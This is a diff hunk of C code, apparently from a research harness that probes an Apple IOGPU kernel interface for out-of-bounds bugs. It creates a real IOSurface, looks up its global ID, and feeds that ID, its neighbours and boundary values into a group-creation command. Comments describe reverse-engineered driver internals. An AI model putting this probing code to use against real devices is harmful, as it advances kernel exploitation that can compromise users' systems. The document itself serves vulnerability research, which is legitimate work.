@@ -751,8 +751,36 @@ void nk_iogpu_group_oob_run(int trigger)
                k, (unsigned long long)grp7);
         }
 
-        static const uint64_t ids[] = { 0, 1, 2, 3, 0xffffffff, 0x10000 };
-        for (uint32_t cmd7 = 0; cmd7 <= 128; cmd7 += 128) {
+        /* The id is a RESOURCE id: cmd 0 creates a group and puts that
+         * resource in it - the shared buffer advances by 0x4000 per call
+         * (a new group each time) and OUT+0x038 is an incrementing group
+         * id. So we hand it a real IOSurface global id. */
+        uint32_t real_id = 0;
+        {
+            const void *keys[] = { kIOSurfaceWidth, kIOSurfaceHeight,
+                                   kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
+            CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int){64});
+            CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int){64});
+            CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int){4});
+            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &(int){0});
+            const void *vals[] = { nw, nh, nb, nf };
+            CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
+                                                      &kCFTypeDictionaryKeyCallBacks,
+                                                      &kCFTypeDictionaryValueCallBacks);
+            IOSurfaceRef srf = props ? IOSurfaceCreate(props) : NULL;
+            if (props) CFRelease(props);
+            CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(nf);
+            if (srf) {
+                uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+                real_id = getid ? getid(srf) : 0;
+                CFRelease(srf);
+            }
+            ol("[grp] surface global id = %u", real_id);
+        }
+        static uint64_t ids[7];
+        ids[0] = 0; ids[1] = 1; ids[2] = real_id; ids[3] = real_id + 1;
+        ids[4] = 0xffffffff; ids[5] = 0x10000; ids[6] = real_id - 1;
+        for (uint32_t cmd7 = 0; cmd7 <= 0; cmd7 += 1) {
         for (uint32_t ii = 0; ii < sizeof(ids)/sizeof(ids[0]); ii++) {
             for (uint32_t f72 = 1; f72 <= 2; f72++) {
                 memset(pool, 0xBB, sizeof(pool));
